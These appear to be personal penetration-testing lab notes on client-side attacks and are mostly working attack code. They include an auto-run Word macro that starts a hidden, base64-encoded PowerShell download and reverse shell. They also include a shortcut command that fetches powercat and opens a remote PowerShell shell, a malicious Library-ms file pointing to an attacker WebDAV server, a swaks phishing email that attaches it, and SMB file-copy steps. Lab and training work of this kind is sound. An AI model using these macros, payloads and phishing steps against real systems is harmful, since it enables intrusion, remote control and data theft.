# client side attacks

```
gobuster dir -x pdf -u http://192.168.197.197:80 -w /usr/share/wordlists/dirb/big.txt


xfreerdp -u offsec -p lab 192.168.229.196:3389

Sub AutoOpen()
    MyMacro
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub MyMacro()
    Dim Str As String

    Str = Str + "powershell.exe -nop -w hidden -e SQBFAFgAKABOAGUAd"
    Str = Str + "wAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAA"
    Str = Str + "uAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhA"
    Str = Str + "GQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADI"
    Str = Str + "ALgAxADYAOAAuADQANQAuADEAOQA0AC8AcABvAHcAZQByAGMAY"
    Str = Str + "QB0AC4AcABzADEAJwApADsAcABvAHcAZQByAGMAYQB0ACAALQB"
    Str = Str + "jACAAMQA5ADIALgAxADYAOAAuADQANQAuADEAOQA0ACAALQBwA"
    Str = Str + "CAANAA0ADQANAAgAC0AZQAgAHAAbwB3AGUAcgBzAGgAZQBsAGw"
    Str = Str + "A"
    
    CreateObject("Wscript.Shell").Run Str
End Sub
```

copy file from windows to kali - set up smb server

on kali
```
mkdir smb
impacket-smbserver -smb2support smb smb
```

from windows - cmd
```
net use \\192.168.45.194\smb
copy \Users\offsec\Desktop\macro.doc \\192.168.45.194\smb
```

### windows libraries attacks
on kali
```
pip3 install wsgidav
mkdir /home/kali/webdav
touch /home/kali/webdav/test.txt
```

run it with auth disabled
```
/home/kali/.local/bin/wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/webdav/
```
view at http://127.0.0.1

on windows
- in vscode create config.Library-ms in offsec/Desktop

create shortcut
```
powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.194:8000/powercat.ps1');powercat -c 192.168.45.194 -p 4444 -e powershell"
```

```
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<name>@windows.storage.dll,-34582</name>
<version>6</version>
<isLibraryPinned>true</isLibraryPinned>
<iconReference>imageres.dll,-1003</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<isDefaultSaveLocation>true</isDefaultSaveLocation>
<isSupported>false</isSupported>
<simpleLocation>
<url>http://192.168.45.194</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```

get onto the host
```
cd webdav
smbclient //192.168.229.195/share -c 'put config.Library-ms'
ls -r -inc flag.txt
```

### VM 2
```
nmap 192.168.229.199
sudo nmap -p80 -sV 192.168.229.199
gobuster dir -u http://192.168.229.199:80 -w /usr/share/wordlists/dirb/big.txt -p pattern
gobuster dir -u http://192.168.229.199:80 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x jpg,jpeg,pdf,lnk,conf
```

inspect file to get the user's name
```
exiftool -a -u info.pdf
```

Hint
1) Start by fuzzing the webserver for some hidden files using gobuster ffuf feroxbuster etc.
2) If powercat is not working out for you then feel free to use some other ways to obtain remote code execution
3) Alternatives to powercat could be found at https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/windows#powershell-shells
4) Make sure you mount the correct path where you have the Webdav folder! Is it root/webdav or /home/kali/webdav?

```
xfreerdp -u offsec -p lab 192.168.229.196:3389

swaks -t dave.wizard@supermagicorg.com --from test@supermagicorg.com -ap --attach config.Library-ms --server 192.168.229.199 --body body.txt --header "Subject: Problems" --suppress-dat
```











